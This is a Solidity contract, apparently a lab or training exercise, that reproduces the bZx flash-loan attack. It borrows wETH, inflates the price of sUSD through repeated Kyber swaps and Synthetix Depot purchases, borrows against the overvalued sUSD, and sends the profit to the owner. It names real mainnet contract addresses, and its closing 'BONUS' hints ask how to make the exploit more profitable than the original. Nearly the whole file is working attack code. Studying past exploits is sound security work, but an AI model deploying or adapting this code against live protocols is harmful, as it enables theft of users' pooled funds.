// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "hardhat/console.sol";

interface iBZX {
    function flashBorrowToken(
        uint256 borrowAmount,
        address borrower,
        address target,
        string calldata signature,
        bytes calldata data)
        external
        payable
        returns (bytes memory);
    function borrowTokenFromDeposit(
        uint256 borrowAmount,           // set to 0 for max
        uint256 leverageAmount,
        uint256 initialLoanDuration,    // duration in seconds
        uint256 collateralTokenSent,    // set to 0 if sending ETH
        address borrower,
        address receiver,
        address collateralTokenAddress, // address(0) means ETH and ETH must be sent with the call
        bytes memory loanDataBytes) // arbitrary order data
        external
        payable
        returns (bytes32 loanOrderHash);
}

interface iWETH {
    function withdraw(uint256 withdrawCount) external;
    function deposit() external payable;
    function transfer(address to, uint256 tokens) external;
    function balanceOf(address tokenOwner) external returns (uint256 tokens);
}

interface iKYBER {
    function swapEtherToToken(address token, uint256 minConversionRate) external payable returns (uint256);
}

interface iSUSD {
    function approve(address spender, uint256 tokens) external;
    function balanceOf(address tokenOwner) external returns (uint256 tokens);
}

interface iDEPOT {
    function exchangeEtherForSynths() external payable returns (uint256);
}

/*
 * Use the interfaces above with the instantiated versions below to implement the bZx hack.
 *
 * Steps:
 * 1. Flash loan from bZx (this will be done in the script and target your 
 * 2. Swap 540 Eth to sUSD via KyberNetworkProxy (this will use the uniswap pool)
 * 3. Buy 20 ETH worth of sUSD via KyberNetworkProxy 18 times (this will use the sUSD Kyber reserve)
 * 4. Buy a large amount of sUSD via the Synthetix Depot contract with `exchangeEtherForSynths()`
 *    The attacker bought 943,837 sUSD with 6000 Ether
 * 5. Borrow Ether with sUSD on the bZx contract
 * 6. Pay back the flash loan from bZx
 */

contract Exploit {
    address immutable owner = msg.sender;

    iBZX constant bZx = iBZX(0x77f973FCaF871459aa58cd81881Ce453759281bC);
    iWETH constant wETH = iWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    iKYBER constant kyber = iKYBER(0x818E6FECD516Ecc3849DAf6845e3EC868087B755);
    iSUSD constant sUSD = iSUSD(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    iDEPOT constant depot = iDEPOT(0x172E09691DfBbC035E37c73B62095caa16Ee2388);

    function exploit() external {
        require(tx.origin == owner);

        // Withdraw the 7500 wETH into ETH
        // *** 7500 ETH is 7500*10**18 WEI
        wETH.withdraw(7500*10**18);

        // Use Kyber to swap 540 ETH to sUSD (in the original exploit this value was passed in)
        // *** You can get the address of sUSD with address(sUSD)
        // *** There is no competition in local testing so use 0 for `minConversionRate`
        kyber.swapEtherToToken{value: 540*10**18}(address(sUSD), 0);

        // Use Kyber to swap 20 ETH to sUSD 18 times over
        // *** There is no competition in local testing so use 0 for `minConversionRate`
        for (uint256 i = 0; i < 18; i++) {
            kyber.swapEtherToToken{value: 20*10**18}(address(sUSD), 0);
        }

        // Use the Synthetix Depot to buy 6000 Ether worth of sUSD
        depot.exchangeEtherForSynths{value: 6000*10**18}();

        // Approve the use of sUSD on bZx (use address(bZx) to get the address of the contract)
        uint256 amount = sUSD.balanceOf(address(this));
        sUSD.approve(address(bZx), amount);

        // Call bZx's `borrowTokenFromDeposit` function to leverage the overvalued sUSD
        // *** if `borrowAmount` is set to 0, it will calculate the max
        // *** `leverageAmount` is based on a per token basis, use 2*10**18 for max leverage
        // *** the hacker used 168 * 3600 as the `initialLoanDuration`
        // *** `collateralTokenSent` is the amount of sUSD you want to send
        // *** this contract is the borrower and receiver, use address(this) to get the address
        // *** `loanDataBytes` can be an empty string
        bZx.borrowTokenFromDeposit(0, 2*10**18, 168*3600, amount, address(this), address(this), address(sUSD), "");

        // Convert 7500 Ether into wETH and send it back to bZx
        wETH.deposit{value: 7500*10**18}();
        wETH.transfer(address(bZx), 7500*10**18);

        // BONUS: Can you make more money than the attacker?
        // Hint: Kyber needs arbitrage!
        // Hint: Can we tweak any `borrowTokenFromDeposit` parameters?
        // Hint: We didn't use the full flash borrow amount, is there a way to use more?
        // Hint: Can we flash borrow more Ether to make this exploit more potent?
    }

    function withdraw() external {
        if (msg.sender == owner) {
            (bool sent,) = owner.call{value: address(this).balance}("");
            require(sent, "Failed to send Ether");
        }
    }

    fallback() external payable {}
    receive() external payable {}
}
